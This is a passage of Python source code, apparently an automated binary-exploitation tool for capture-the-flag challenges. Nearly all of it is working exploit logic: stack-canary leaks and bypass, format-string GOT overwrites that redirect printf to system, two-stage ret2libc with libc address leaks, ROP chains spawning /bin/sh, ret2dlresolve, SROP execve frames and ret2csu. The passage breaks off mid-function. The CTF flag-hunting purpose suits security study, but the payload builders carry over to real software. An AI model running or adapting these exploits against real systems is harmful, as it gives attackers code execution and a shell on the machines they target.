            probe = f"%{i}$p".encode()
            try:
                proc = process(self.binary, level="error")
                proc.sendline(probe)
                try:
                    output = proc.recvall(timeout=3)
                except Exception:
                    try:
                        output = proc.recv(timeout=2)
                    except Exception:
                        output = b""
                proc.close()
            except Exception:
                continue

            text = output.decode("utf-8", errors="replace")
            for m in re.finditer(r"0x([0-9a-fA-F]+)", text):
                val_str = m.group(1)
                try:
                    val = int(val_str, 16)
                except ValueError:
                    continue

                # Canary identification:
                # - 64-bit: 8 bytes, lowest byte is 0x00
                # - 32-bit: 4 bytes, lowest byte is 0x00
                # - Not a common value like 0, small numbers, or addresses
                if self.bits == 64:
                    if (val & 0xFF) == 0 and val > 0x1000 and val < 0x00FFFFFFFFFFFFFF:
                        # Looks like a canary
                        val_bytes = val.to_bytes(8, 'little')
                        # Canary shouldn't look like an address (starts with 0x7f or 0x55)
                        top_byte = (val >> 56) & 0xFF
                        if top_byte not in (0x7f, 0x55, 0x56, 0x00):
                            canary = val
                            canary_pos = i
                            print(f"[+] Potential canary found at position {i}: {hex(val)}")
                            break
                else:
                    if (val & 0xFF) == 0 and val > 0x1000 and val < 0xFFFFFFFF:
                        canary = val
                        canary_pos = i
                        print(f"[+] Potential canary found at position {i}: {hex(val)}")
                        break

            if canary is not None:
                break

        if canary is None:
            print("[-] Could not identify canary value")
            return None

        self.leaked_canary = canary

        # Now build overflow with canary placed correctly
        # Need to know the offset to the canary and then to return address
        # Canary is typically right after the buffer, before saved RBP
        pack = p64 if self.bits == 64 else p32
        word_size = 8 if self.bits == 64 else 4
        ret_gadget = self._find_ret_gadget()

        # Get buffer size from source
        buf_offset = self._offset_from_source()
        if buf_offset is not None:
            # buf_offset includes saved rbp, canary is before it
            # Layout: [buffer][canary][saved_rbp][return_addr]
            # offset_to_canary = buffer_size
            # buf_offset = buffer_size + saved_rbp
            canary_offset = buf_offset - word_size  # before saved rbp
        else:
            # Try common sizes
            canary_offset = None
            for buf_size in [16, 24, 32, 40, 48, 56, 64, 72, 80, 96, 104, 128, 256]:
                canary_offset = buf_size
                break  # Start with smallest

        if canary_offset is None:
            return None

        # Try multiple canary offsets
        for target_name, target_addr in self.win_functions.items():
            for c_off in [16, 24, 32, 40, 48, 56, 64, 72, 80, 96, 104, 128, 256]:
                # payload = padding + canary + saved_rbp + return_addr
                payload = b"A" * c_off
                payload += pack(canary)
                payload += pack(0)  # saved rbp
                if self.bits == 64 and ret_gadget:
                    payload += pack(ret_gadget)
                payload += pack(target_addr)

                flag = self._run_payload_and_extract(payload)
                if flag:
                    print(f"[+] Canary bypass succeeded (offset={c_off}, win={target_name})!")
                    return flag

        return None

    def _fmtstr_find_offset(self) -> int | None:
        """Find the format string offset (position of our input on stack)."""
        if not self.elf:
            return None

        # Send a known marker and find where it appears
        marker = b"AAAA" if self.bits == 32 else b"AAAAAAAA"
        for i in range(1, 50):
            probe = marker + f".%{i}$p".encode()
            try:
                proc = process(self.binary, level="error")
                proc.sendline(probe)
                try:
                    output = proc.recvall(timeout=3)
                except Exception:
                    try:
                        output = proc.recv(timeout=2)
                    except Exception:
                        output = b""
                proc.close()
            except Exception:
                continue

            text = output.decode("utf-8", errors="replace")
            # Check if leaked value matches our marker
            if self.bits == 32:
                expected = "0x41414141"
            else:
                expected = "0x4141414141414141"

            if expected in text:
                print(f"[+] Format string offset found: {i}")
                return i

        return None

    def _fmtstr_got_overwrite(self) -> str | None:
        """Overwrite GOT entry via format string to redirect to win function."""
        if not self.elf or not self.win_functions:
            return None

        fmtstr_offset = self._fmtstr_find_offset()
        if fmtstr_offset is None:
            print("[-] Could not determine format string offset")
            return None

        # Target: overwrite printf/puts/exit GOT with win function
        win_addr = list(self.win_functions.values())[0]
        win_name = list(self.win_functions.keys())[0]

        # Try to generate the exploit using pwntools fmtstr_payload
        try:
            from pwnlib.fmtstr import fmtstr_payload
        except ImportError:
            print("[-] fmtstr_payload not available")
            return None

        # Try overwriting different GOT entries
        for func_name in ["printf", "puts", "exit", "__stack_chk_fail", "strlen"]:
            got_addr = self.elf.got.get(func_name)
            if got_addr is None:
                continue

            print(f"[*] Trying GOT overwrite: {func_name}@GOT -> {win_name}")

            try:
                if self.bits == 64:
                    payload = fmtstr_payload(fmtstr_offset, {got_addr: win_addr}, write_size="short")
                else:
                    payload = fmtstr_payload(fmtstr_offset, {got_addr: win_addr})
            except Exception as exc:
                print(f"[-] Failed to generate fmtstr payload: {exc}")
                continue

            try:
                proc = process(self.binary, level="error")
                proc.sendline(payload)
                # Send another input to trigger the overwritten function
                try:
                    proc.sendline(b"trigger")
                except Exception:
                    pass
                try:
                    output = proc.recvall(timeout=5)
                except Exception:
                    try:
                        output = proc.recv(timeout=3)
                    except Exception:
                        output = b""
                proc.close()
            except Exception:
                continue

            text = output.decode("utf-8", errors="replace")
            flags = _scan_flags(text, self.flag_format)
            if flags:
                return _best_flag(flags)

        return None

    def _fmtstr_got_system_overwrite(self) -> str | None:
        """Overwrite printf@GOT with system@PLT, then send '/bin/sh'.

        This works when:
        - printf@GOT is writable (Partial RELRO)
        - system@PLT exists in the binary
        - Binary loops (so we can trigger printf again with '/bin/sh')
        """
        if not self.elf:
            return None

        system_plt = self.elf.plt.get("system")
        if system_plt is None:
            return None

        fmtstr_offset = self._fmtstr_find_offset()
        if fmtstr_offset is None:
            return None

        try:
            from pwnlib.fmtstr import fmtstr_payload
        except ImportError:
            return None

        # Try overwriting printf@GOT -> system@PLT
        for func_name in ["printf", "puts"]:
            got_addr = self.elf.got.get(func_name)
            if got_addr is None:
                continue

            print(f"[*] Trying {func_name}@GOT -> system@PLT overwrite")
            writes = {got_addr: system_plt}

            try:
                if self.bits == 64:
                    payload = fmtstr_payload(fmtstr_offset, writes, write_size="short")
                else:
                    payload = fmtstr_payload(fmtstr_offset, writes)
            except Exception as exc:
                print(f"[-] fmtstr_payload generation failed: {exc}")
                continue

            try:
                proc = self._get_target()
                proc.sendline(payload)
                time.sleep(0.5)
                # Now send "/bin/sh" -- when printf("/bin/sh") is called,
                # it becomes system("/bin/sh")
                proc.sendline(b"/bin/sh")

                flag = self._interact_and_extract(proc)
                if flag:
                    return flag
            except Exception as exc:
                print(f"[-] GOT->system exploit failed: {exc}")
                try:
                    proc.close()
                except Exception:
                    pass

        return None

    # -----------------------------------------------------------------------
    # Strategy 4: ret2libc
    # -----------------------------------------------------------------------
    def try_ret2libc(self) -> str | None:
        """Leak libc address via GOT/PLT, calculate system/binsh, build ROP chain.

        Complete 2-stage ret2libc:
        Stage 1: Leak GOT entry via puts/printf PLT
        Stage 2: Return to main for second payload
        Stage 3: Calculate libc base from leaked address
        Stage 4: Build system("/bin/sh") chain
        """
        if self.protections.get("pie"):
            print("[-] ret2libc: PIE enabled - need a leak first")
            return None

        if self.offset is None:
            print("[-] ret2libc: No overflow offset found")
            return None

        if self.bits != 64:
            # For 32-bit, try simpler approach first
            result = self._try_ret2libc_32()
            if result:
                return result
            # Then try full 32-bit leak chain
            return self._try_ret2libc_32_leak()

        print("[*] Trying ret2libc (64-bit)...")

        if not self.elf:
            return None

        pack = p64

        # Need: pop rdi; ret + puts@PLT + puts@GOT + main/vuln address
        pop_rdi = self._find_pop_rdi_ret()
        if not pop_rdi:
            print("[-] ret2libc: No 'pop rdi; ret' gadget found")
            return None

        ret_gadget = self._find_ret_gadget()

        # Find puts or printf for leaking
        leak_func_name = None
        leak_func = None
        leak_got = None
        for fn in ["puts", "printf", "write"]:
            if fn in self.elf.plt and fn in self.elf.got:
                leak_func_name = fn
                leak_func = self.elf.plt[fn]
                leak_got = self.elf.got[fn]
                print(f"[+] Using {fn} for libc leak (PLT={hex(leak_func)}, GOT={hex(leak_got)})")
                break

        if not leak_func:
            print("[-] ret2libc: No suitable leak function found")
            return None

        # Find main address for looping back
        main_addr = self.elf.symbols.get("main")
        if main_addr is None:
            # Try _start or vuln
            for name in ["_start", "vuln", "vulnerable"]:
                if name in self.elf.symbols:
                    main_addr = self.elf.symbols[name]
                    break

        if main_addr is None:
            print("[-] ret2libc: Cannot find main/_start to loop back")
            return None

        print(f"[+] Will return to {hex(main_addr)} after leak")

        # ---- Stage 1: Leak libc address ----
        # Build ROP chain using pwntools ROP for cleaner chain construction
        try:
            rop1 = ROP(self.elf)
            if ret_gadget:
                rop1.raw(ret_gadget)
            rop1.raw(pop_rdi)
            rop1.raw(leak_got)
            rop1.raw(leak_func)
            rop1.raw(main_addr)
            stage1 = b"A" * self.offset + rop1.chain()
        except Exception:
            # Fallback to manual construction
            stage1 = b"A" * self.offset
            if ret_gadget:
                stage1 += pack(ret_gadget)
            stage1 += pack(pop_rdi)
            stage1 += pack(leak_got)
            stage1 += pack(leak_func)
            stage1 += pack(main_addr)

        print("[*] Stage 1: Leaking libc address...")
        try:
            proc = self._get_target()

            # Receive initial prompt if any
            try:
                proc.recv(timeout=2)
            except Exception:
                pass

            proc.sendline(stage1)

            try:
                leaked_data = proc.recv(timeout=5)
            except Exception:
                leaked_data = b""

            # Parse the leaked address
            # The leak is typically on its own line or at the start of output
            leaked_addr = None

            # Try to find the raw leaked bytes (6 bytes for 64-bit address)
            raw_lines = leaked_data.split(b"\n")
            for line in raw_lines:
                line_stripped = line.strip()
                if len(line_stripped) == 0:
                    continue
                # A valid libc address in 64-bit starts with 0x7f
                if len(line_stripped) >= 6:
                    try:
                        addr_candidate = u64(line_stripped[:6].ljust(8, b"\x00"))
                        # Check if it looks like a libc address
                        if (addr_candidate >> 40) == 0x7f:
                            leaked_addr = addr_candidate
                            break
                    except Exception:
                        pass

            # Fallback: try the raw data
            if leaked_addr is None and len(leaked_data) >= 6:
                try:
                    addr_candidate = u64(leaked_data[:6].ljust(8, b"\x00"))
                    if (addr_candidate >> 40) == 0x7f:
                        leaked_addr = addr_candidate
                except Exception:
                    pass

            # Fallback: try all 6-byte windows
            if leaked_addr is None:
                for i in range(len(leaked_data) - 5):
                    try:
                        addr_candidate = u64(leaked_data[i:i+6].ljust(8, b"\x00"))
                        if (addr_candidate >> 40) == 0x7f:
                            leaked_addr = addr_candidate
                            break
                    except Exception:
                        pass

            if leaked_addr is None:
                print("[-] ret2libc: Failed to leak libc address")
                try:
                    proc.close()
                except Exception:
                    pass
                return None

            print(f"[+] Leaked address: {hex(leaked_addr)}")

            # ---- Stage 3: Determine libc base ----
            libc_base = None
            if self.libc_elf:
                # Use provided libc
                libc_func_offset = self.libc_elf.symbols.get(leak_func_name)
                if libc_func_offset:
                    libc_base = leaked_addr - libc_func_offset
                    print(f"[+] libc base (from provided libc): {hex(libc_base)}")
            else:
                # Try to find libc on the system
                libc_paths = [
                    "/lib/x86_64-linux-gnu/libc.so.6",
                    "/lib64/libc.so.6",
                    "/usr/lib/libc.so.6",
                    "/lib/libc.so.6",
                ]
                for lp in libc_paths:
                    if os.path.isfile(lp):
                        try:
                            self.libc_elf = ELF(lp, checksec=False)
                            libc_func_offset = self.libc_elf.symbols.get(leak_func_name)
                            if libc_func_offset:
                                libc_base = leaked_addr - libc_func_offset
                                print(f"[+] Using system libc: {lp}")
                                print(f"[+] libc base: {hex(libc_base)}")
                            break
                        except Exception:
                            continue

            # If no libc found, try common offsets
            if libc_base is None:
                print("[*] No libc file found, trying common offsets...")
                for puts_off, sys_off, binsh_off in COMMON_LIBC_OFFSETS:
                    candidate_base = leaked_addr - puts_off
                    # libc base should be page-aligned
                    if candidate_base & 0xFFF == 0 and candidate_base > 0:
                        libc_base = candidate_base
                        # Create a fake libc info dict for stage 2
                        system_addr = libc_base + sys_off
                        binsh_addr = libc_base + binsh_off
                        print(f"[+] Trying common libc offset: base={hex(libc_base)}")
                        print(f"[+] system={hex(system_addr)}, /bin/sh={hex(binsh_addr)}")

                        # ---- Stage 4 with common offsets ----
                        stage2 = b"A" * self.offset
                        if ret_gadget:
                            stage2 += pack(ret_gadget)
                        stage2 += pack(pop_rdi)
                        stage2 += pack(binsh_addr)
                        stage2 += pack(system_addr)

                        try:
                            # Wait for binary to re-prompt
                            try:
                                proc.recv(timeout=2)
                            except Exception:
                                pass
                            proc.sendline(stage2)
                            flag = self._interact_and_extract(proc)
                            if flag:
                                print("[+] ret2libc succeeded (common offsets)!")
                                return flag
                            # Need a new connection for next attempt
                            proc = self._get_target()
                            try:
                                proc.recv(timeout=2)
                            except Exception:
                                pass
                            # Re-do stage 1
                            proc.sendline(stage1)
                            try:
                                proc.recv(timeout=3)
                            except Exception:
                                pass
                        except Exception:
                            try:
                                proc = self._get_target()
                                proc.recv(timeout=2)
                                proc.sendline(stage1)
                                proc.recv(timeout=3)
                            except Exception:
                                pass
                return None

            if libc_base is None or libc_base < 0 or (libc_base & 0xFFF) != 0:
                print("[-] ret2libc: Could not determine valid libc base")
                try:
                    proc.close()
                except Exception:
                    pass
                return None

            # ---- Stage 4: Call system("/bin/sh") ----
            if self.libc_elf:
                self.libc_elf.address = libc_base
                system_addr = self.libc_elf.symbols["system"]
                try:
                    binsh_addr = next(self.libc_elf.search(b"/bin/sh"))
                except StopIteration:
                    print("[-] ret2libc: /bin/sh not found in libc")
                    try:
                        proc.close()
                    except Exception:
                        pass
                    return None
            else:
                print("[-] ret2libc: No libc for stage 2")
                try:
                    proc.close()
                except Exception:
                    pass
                return None

            print(f"[+] system @ {hex(system_addr)}")
            print(f"[+] /bin/sh @ {hex(binsh_addr)}")

            # Build stage 2 payload using pwntools ROP
            try:
                rop2 = ROP(self.libc_elf)
                rop2.system(next(self.libc_elf.search(b"/bin/sh")))
                stage2 = b"A" * self.offset + rop2.chain()
            except Exception:
                # Fallback to manual construction
                stage2 = b"A" * self.offset
                if ret_gadget:
                    stage2 += pack(ret_gadget)
                stage2 += pack(pop_rdi)
                stage2 += pack(binsh_addr)
                stage2 += pack(system_addr)

            # Wait for the binary to loop back to main and re-prompt
            try:
                proc.recv(timeout=2)
            except Exception:
                pass

            proc.sendline(stage2)

            # Try to interact with the shell
            flag = self._interact_and_extract(proc)
            if flag:
                print("[+] ret2libc succeeded!")
                return flag

        except Exception as exc:
            print(f"[-] ret2libc failed: {exc}")
            try:
                proc.close()
            except Exception:
                pass

        return None

    def _try_ret2libc_32(self) -> str | None:
        """ret2libc for 32-bit binaries (system + /bin/sh via stack)."""
        if not self.elf or self.offset is None:
            return None

        print("[*] Trying ret2libc (32-bit, direct)...")

        # Check if system@plt and /bin/sh are in the binary
        system_addr = self.elf.plt.get("system") or self.elf.symbols.get("system")
        if system_addr is None:
            print("[-] ret2libc 32: system() not found")
            return None

        sh_addr = None
        try:
            sh_addr = next(self.elf.search(b"/bin/sh"))
        except StopIteration:
            pass

        if sh_addr is None:
            print("[-] ret2libc 32: '/bin/sh' not found in binary")
            return None

        print(f"[+] system @ {hex(system_addr)}")
        print(f"[+] /bin/sh @ {hex(sh_addr)}")

        # 32-bit calling convention: args on stack
        # Payload: padding + system + fake_ret + /bin/sh
        payload = b"A" * self.offset
        payload += p32(system_addr)
        payload += p32(0xDEADBEEF)  # return address (don't care)
        payload += p32(sh_addr)

        try:
            proc = self._get_target()
            try:
                proc.recv(timeout=2)
            except Exception:
                pass
            proc.sendline(payload)

            flag = self._interact_and_extract(proc)
            if flag:
                print("[+] ret2libc 32 succeeded!")
                return flag
        except Exception as exc:
            print(f"[-] ret2libc 32 failed: {exc}")

        return None

    def _try_ret2libc_32_leak(self) -> str | None:
        """Full ret2libc for 32-bit with GOT leak when system not in binary."""
        if not self.elf or self.offset is None:
            return None

        print("[*] Trying ret2libc (32-bit, with leak)...")

        # Find leak function
        leak_func_name = None
        leak_func = None
        leak_got = None
        for fn in ["puts", "printf"]:
            if fn in self.elf.plt and fn in self.elf.got:
                leak_func_name = fn
                leak_func = self.elf.plt[fn]
                leak_got = self.elf.got[fn]
                break

        if not leak_func:
            return None

        main_addr = self.elf.symbols.get("main")
        if main_addr is None:
            for name in ["_start", "vuln", "vulnerable"]:
                if name in self.elf.symbols:
                    main_addr = self.elf.symbols[name]
                    break
        if main_addr is None:
            return None

        # Stage 1: Leak
        # 32-bit: padding + PLT[puts] + main + GOT[puts]
        stage1 = b"A" * self.offset
        stage1 += p32(leak_func)
        stage1 += p32(main_addr)  # return after puts
        stage1 += p32(leak_got)   # argument to puts

        try:
            proc = self._get_target()
            try:
                proc.recv(timeout=2)
            except Exception:
                pass
            proc.sendline(stage1)

            try:
                leaked_data = proc.recv(timeout=3)
            except Exception:
                leaked_data = b""

            # Parse leaked 32-bit address
            leaked_addr = None
            raw_lines = leaked_data.split(b"\n")
            for line in raw_lines:
                line = line.strip()
                if len(line) >= 4:
                    try:
                        addr_candidate = u32(line[:4])
                        if 0xf7000000 <= addr_candidate <= 0xf8000000:
                            leaked_addr = addr_candidate
                            break
                    except Exception:
                        pass

            if leaked_addr is None:
                print("[-] ret2libc 32 leak: Failed to parse leaked address")
                proc.close()
                return None

            print(f"[+] Leaked 32-bit address: {hex(leaked_addr)}")

            # Find libc
            if not self.libc_elf:
                for lp in ["/lib/i386-linux-gnu/libc.so.6", "/lib32/libc.so.6",
                           "/lib/libc.so.6"]:
                    if os.path.isfile(lp):
                        try:
                            self.libc_elf = ELF(lp, checksec=False)
                            break
                        except Exception:
                            continue

            if not self.libc_elf:
                proc.close()
                return None

            libc_func_offset = self.libc_elf.symbols.get(leak_func_name)
            if not libc_func_offset:
                proc.close()
                return None

            libc_base = leaked_addr - libc_func_offset
            self.libc_elf.address = libc_base
            system_addr = self.libc_elf.symbols["system"]
            try:
                binsh_addr = next(self.libc_elf.search(b"/bin/sh"))
            except StopIteration:
                proc.close()
                return None

            # Stage 2
            stage2 = b"A" * self.offset
            stage2 += p32(system_addr)
            stage2 += p32(0xDEADBEEF)
            stage2 += p32(binsh_addr)

            try:
                proc.recv(timeout=2)
            except Exception:
                pass
            proc.sendline(stage2)

            flag = self._interact_and_extract(proc)
            if flag:
                print("[+] ret2libc 32 leak succeeded!")
                return flag

        except Exception as exc:
            print(f"[-] ret2libc 32 leak failed: {exc}")
            try:
                proc.close()
            except Exception:
                pass

        return None

    # -----------------------------------------------------------------------
    # Strategy 5: ROP chain
    # -----------------------------------------------------------------------
    def try_rop_chain(self) -> str | None:
        """Build a ROP chain to call execve/system."""
        if self.protections.get("pie"):
            print("[-] ROP: PIE enabled - static ROP won't work")
            return None

        if self.offset is None:
            print("[-] ROP: No overflow offset found")
            return None

        if not self.elf:
            return None

        print("[*] Trying ROP chain exploitation...")

        # Check if we have system@plt and /bin/sh in the binary
        system_plt = self.elf.plt.get("system")
        sh_addr = None
        try:
            sh_addr = next(self.elf.search(b"/bin/sh"))
        except StopIteration:
            pass

        pack = p64 if self.bits == 64 else p32

        if system_plt and sh_addr:
            print(f"[+] system@plt and /bin/sh available in binary")
            pop_rdi = self._find_pop_rdi_ret()
            ret_gadget = self._find_ret_gadget()

            if self.bits == 64 and pop_rdi:
                payload = b"A" * self.offset
                if ret_gadget:
                    payload += pack(ret_gadget)
                payload += pack(pop_rdi)
                payload += pack(sh_addr)
                payload += pack(system_plt)

                flag = self._run_payload_and_extract(
                    payload,
                    send_after=[b"cat flag* 2>/dev/null", b"cat /flag* 2>/dev/null"],
                )
                if flag:
                    print("[+] ROP chain (system@plt) succeeded!")
                    return flag

            elif self.bits == 32:
                payload = b"A" * self.offset
                payload += pack(system_plt)
                payload += pack(0xDEADBEEF)
                payload += pack(sh_addr)

                flag = self._run_payload_and_extract(
                    payload,
                    send_after=[b"cat flag* 2>/dev/null", b"cat /flag* 2>/dev/null"],
                )
                if flag:
                    print("[+] ROP chain (system@plt 32-bit) succeeded!")
                    return flag

        # Try using pwntools auto-ROP
        try:
            if self.rop:
                print("[*] Trying pwntools auto-ROP chain...")
                self.rop = ROP(self.elf)

                if system_plt and sh_addr:
                    if self.bits == 64:
                        self.rop.raw(b"A" * self.offset)
                        self.rop.system(sh_addr)
                        payload = self.rop.chain()
                    else:
                        self.rop.raw(b"A" * self.offset)
                        self.rop.system(sh_addr)
                        payload = self.rop.chain()

                    flag = self._run_payload_and_extract(
                        payload,
                        send_after=[b"cat flag* 2>/dev/null"],
                    )
                    if flag:
                        print("[+] Auto-ROP chain succeeded!")
                        return flag
        except Exception as exc:
            print(f"[-] Auto-ROP failed: {exc}")

        print("[-] ROP: No strategy yielded a flag")
        return None

    # -----------------------------------------------------------------------
    # Strategy 6: Stack pivot
    # -----------------------------------------------------------------------
    def try_stack_pivot(self) -> str | None:
        """Use stack pivot to redirect execution when overflow is limited."""
        if self.protections.get("pie"):
            return None

        if self.offset is None:
            return None

        if not self.elf:
            return None

        print("[*] Trying stack pivot...")

        # Look for xchg gadgets or leave; ret for stack pivot
        leave_ret = None

        if self.rop:
            try:
                leave = self.rop.find_gadget(["leave", "ret"])
                if leave:
                    leave_ret = leave.address
                    print(f"[+] leave; ret gadget @ {hex(leave_ret)}")
            except Exception:
                pass

        if not leave_ret:
            leave_ret_ropper = self._ropper_search("leave")
            if leave_ret_ropper:
                leave_ret = leave_ret_ropper
                print(f"[+] leave; ret gadget (ropper) @ {hex(leave_ret)}")

        if not leave_ret:
            print("[-] stack pivot: No leave;ret gadget found")
            return None

        # For stack pivot, we need to control where rbp/ebp points to
        # and have our ROP chain at that location
        pack = p64 if self.bits == 64 else p32

        # Use .bss as a pivot target
        bss_addr = None
        for seg in self.elf.segments:
            if seg.header.p_type == "PT_LOAD" and seg.header.p_flags & 2:  # writable
                bss_addr = seg.header.p_vaddr + seg.header.p_memsz - 0x800
                break

        if bss_addr is None:
            try:
                bss_addr = self.elf.bss() + 0x200
            except Exception:
                print("[-] stack pivot: Cannot find writable memory")
                return None

        print(f"[+] Pivot target (BSS area): {hex(bss_addr)}")
        print("[*] Stack pivot gadgets found but automated exploitation")
        print("    requires binary-specific analysis. Logging for manual use.")

        return None

    # -----------------------------------------------------------------------
    # Strategy 7: One-gadget
    # -----------------------------------------------------------------------
    def try_one_gadget(self) -> str | None:
        """Find and use one_gadget from libc for simpler shell."""
        if self.protections.get("pie"):
            print("[-] one_gadget: PIE enabled")
            return None

        if self.offset is None:
            print("[-] one_gadget: No overflow offset found")
            return None

        print("[*] Trying one_gadget exploitation...")

        # Find libc path
        libc_path = self.libc_path
        if not libc_path:
            for lp in [
                "/lib/x86_64-linux-gnu/libc.so.6",
                "/lib64/libc.so.6",
                "/usr/lib/libc.so.6",
                "/lib/libc.so.6",
                "/lib/i386-linux-gnu/libc.so.6",
            ]:
                if os.path.isfile(lp):
                    libc_path = lp
                    break

        if not libc_path:
            print("[-] one_gadget: No libc found")
            return None

        # Run one_gadget tool
        try:
            result = subprocess.run(
                ["one_gadget", libc_path],
                capture_output=True, text=True, timeout=30,
            )
            gadgets = []
            for line in result.stdout.splitlines():
                m = re.match(r"\s*(0x[0-9a-fA-F]+)\s", line)
                if m:
                    gadgets.append(int(m.group(1), 16))

            if not gadgets:
                print("[-] one_gadget: No gadgets found")
                return None

            print(f"[+] Found {len(gadgets)} one_gadgets: {[hex(g) for g in gadgets]}")
        except FileNotFoundError:
            print("[-] one_gadget: Tool not installed")
            return None
        except Exception as exc:
            print(f"[-] one_gadget failed: {exc}")
            return None

        # If we already have a libc leak (from ret2libc attempt), use it
        # Otherwise, we need to leak libc first (same as ret2libc Stage 1)
        # For simplicity, if libc base is known, try each one_gadget
        # This is mainly useful when combined with a format string or other leak

        print("[*] one_gadget requires libc base leak - see ret2libc strategy")
        return None

    # -----------------------------------------------------------------------
    # Strategy 8: ret2dlresolve (NEW)
    # -----------------------------------------------------------------------
    def try_ret2dlresolve(self) -> str | None:
        """Exploit using ret2dlresolve technique.

        Works WITHOUT libc and WITHOUT a leak.
        Conditions: Partial RELRO + no PIE + buffer overflow known.
        Forges a fake relocation entry to resolve 'system' with arg '/bin/sh'.
        """
        if self.protections.get("pie"):
            print("[-] ret2dlresolve: PIE enabled - cannot use")
            return None

        if self.offset is None:
            print("[-] ret2dlresolve: No overflow offset found")
            return None

        relro = str(self.protections.get("relro", "")).lower()
        if relro == "full":
            print("[-] ret2dlresolve: Full RELRO - GOT is read-only")
            return None

        if not self.elf:
            return None

        print("[*] Trying ret2dlresolve exploitation...")

        try:
            from pwnlib.rop.ret2dlresolve import Ret2dlresolvePayload
        except ImportError:
            print("[-] ret2dlresolve: pwnlib.rop.ret2dlresolve not available")
            return None

        try:
            dlresolve = Ret2dlresolvePayload(self.elf, symbol="system", args=["/bin/sh"])
        except Exception as exc:
            print(f"[-] ret2dlresolve: Failed to create payload: {exc}")
            return None

        try:
            rop = ROP(self.elf)

            # We need read(0, dlresolve.data_addr) to write the forged structures
            # Check if read@plt exists
            if "read" in self.elf.plt:
                rop.read(0, dlresolve.data_addr)
            elif "gets" in self.elf.plt:
                # Alternative: use gets to read data
                rop.gets(dlresolve.data_addr)
            else:
                print("[-] ret2dlresolve: No read/gets function in PLT")
                return None

            rop.ret2dlresolve(dlresolve)

            payload = b"A" * self.offset + rop.chain()

            print(f"[*] ret2dlresolve payload size: {len(payload)} bytes")
            print(f"[*] Data address: {hex(dlresolve.data_addr)}")

            proc = self._get_target()
            try:
                proc.recv(timeout=2)
            except Exception:
                pass

            proc.sendline(payload)

            # Send the dlresolve payload data
            time.sleep(0.5)
            proc.send(dlresolve.payload)

            # We should get a shell
            flag = self._interact_and_extract(proc)
            if flag:
                print("[+] ret2dlresolve succeeded!")
                return flag

        except Exception as exc:
            print(f"[-] ret2dlresolve failed: {exc}")
            try:
                proc.close()
            except Exception:
                pass

        return None

    # -----------------------------------------------------------------------
    # Strategy 9: SROP (Sigreturn-Oriented Programming) (NEW)
    # -----------------------------------------------------------------------
    def try_srop(self) -> str | None:
        """Exploit using SROP (Sigreturn-Oriented Programming).

        Uses SigreturnFrame to set up registers for execve("/bin/sh", 0, 0).
        Requires: syscall gadget + ability to set rax=15 (SYS_rt_sigreturn).
        """
        if self.protections.get("pie"):
            print("[-] SROP: PIE enabled")
            return None

        if self.offset is None:
            print("[-] SROP: No overflow offset found")
            return None

        if not self.elf:
            return None

        print("[*] Trying SROP exploitation...")

        # Need syscall gadget and pop rax gadget
        syscall_addr = self._find_syscall_ret()
        if not syscall_addr:
            print("[-] SROP: No syscall gadget found")
            return None

        pop_rax = self._find_pop_rax_ret()
        if not pop_rax:
            print("[-] SROP: No 'pop rax; ret' gadget found")
            return None

        print(f"[+] syscall @ {hex(syscall_addr)}")
        print(f"[+] pop rax; ret @ {hex(pop_rax)}")

        # Find /bin/sh string in binary
        binsh_addr = None
        try:
            binsh_addr = next(self.elf.search(b"/bin/sh\x00"))
        except StopIteration:
            pass

        if binsh_addr is None:
            # Try to find a writable area and put /bin/sh there
            # Use .bss section
            try:
                binsh_addr = self.elf.bss() + 0x100
                print(f"[*] Will need to write /bin/sh to BSS @ {hex(binsh_addr)}")
                # For now, skip if /bin/sh not in binary - SROP is less useful
                # unless we can write the string somewhere
            except Exception:
                pass

        if binsh_addr is None:
            print("[-] SROP: Cannot find /bin/sh string")
            return None

        try:
            from pwn import SigreturnFrame

            pack = p64 if self.bits == 64 else p32

            if self.bits == 64:
                context.arch = "amd64"
                frame = SigreturnFrame(kernel="amd64")
                frame.rax = constants.SYS_execve      # 59
                frame.rdi = binsh_addr                  # filename = "/bin/sh"
                frame.rsi = 0                           # argv = NULL
                frame.rdx = 0                           # envp = NULL
                frame.rip = syscall_addr                # execute syscall
                frame.rsp = binsh_addr                  # doesn't matter much

                # Payload: padding + pop_rax + 15 + syscall + sigreturn_frame
                payload = b"A" * self.offset
                payload += pack(pop_rax)
                payload += pack(15)          # SYS_rt_sigreturn
                payload += pack(syscall_addr)
                payload += bytes(frame)

            else:
                context.arch = "i386"
                frame = SigreturnFrame(kernel="i386")
                frame.eax = constants.SYS_execve       # 11
                frame.ebx = binsh_addr
                frame.ecx = 0
                frame.edx = 0
                frame.eip = syscall_addr

                int80 = self._find_int80_ret()
                if not int80:
                    print("[-] SROP 32-bit: No int 0x80 gadget found")
                    return None

                payload = b"A" * self.offset
                payload += p32(pop_rax) if pop_rax else b""
                payload += p32(0x77)        # SYS_sigreturn (i386)
                payload += p32(int80)
                payload += bytes(frame)

            flag = self._run_payload_and_extract(payload, shell_mode=True)
            if flag:
                print("[+] SROP succeeded!")
                return flag

        except Exception as exc:
            print(f"[-] SROP failed: {exc}")

        return None

    # -----------------------------------------------------------------------
    # Strategy 10: ret2csu (NEW)
    # -----------------------------------------------------------------------
    def try_ret2csu(self) -> str | None:
        """Exploit using __libc_csu_init universal gadget.

        Present in every dynamically-linked ELF. Provides control over
        rdi, rsi, rdx via the csu gadgets.
        """
        if self.protections.get("pie"):
            print("[-] ret2csu: PIE enabled")
            return None

        if self.offset is None:
            print("[-] ret2csu: No overflow offset found")
            return None

        if not self.elf:
            return None

        if self.bits != 64:
            print("[-] ret2csu: Only works on 64-bit binaries")
            return None

        print("[*] Trying ret2csu exploitation...")

        # Check for __libc_csu_init
        csu_init = self.elf.symbols.get("__libc_csu_init")
        if csu_init is None:
            print("[-] ret2csu: __libc_csu_init not found")
            return None

        print(f"[+] __libc_csu_init @ {hex(csu_init)}")

        # Try using pwntools ret2csu
        try:
            rop = ROP(self.elf)

            # Check if we have system in GOT (resolved) or execve
            # ret2csu is most useful to set rdx for execve
            # or to call a function pointer in GOT

            # If system@plt exists and we have /bin/sh
            system_plt = self.elf.plt.get("system")
            sh_addr = None
            try:
                sh_addr = next(self.elf.search(b"/bin/sh"))
            except StopIteration:
                pass

            if system_plt and sh_addr:
                try:
                    rop.ret2csu(edi=sh_addr, rsi=0, rdx=0, call=self.elf.got.get("system", system_plt))
                    payload = b"A" * self.offset + rop.chain()

                    flag = self._run_payload_and_extract(payload, shell_mode=True)
                    if flag:
                        print("[+] ret2csu (system) succeeded!")
                        return flag
                except Exception as exc:
                    print(f"[-] ret2csu system call failed: {exc}")

            # Try with execve if available
